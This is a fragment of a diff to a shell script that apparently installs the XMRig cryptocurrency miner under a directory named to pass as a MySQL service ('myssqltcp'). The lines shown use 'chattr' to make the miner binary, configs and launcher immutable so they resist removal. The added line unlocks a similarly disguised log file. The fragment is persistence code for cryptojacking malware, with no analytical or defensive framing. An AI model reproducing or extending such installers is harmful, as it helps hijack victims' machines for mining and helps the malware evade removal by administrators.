@@ -911,6 +911,7 @@ chattr -V +iau $HOME/myssqltcp/xmrig
 chattr -V +iau $HOME/myssqltcp/config_background.json
 chattr -V +iau $HOME/myssqltcp/config.json
 chattr -V +iau $HOME/myssqltcp/xmrig.sh
+chattr -V -iau $HOME/myssqltcp/myssqlsys.log
 
 echo "[*] Setup complete"
 echo "[*] 安装完成"
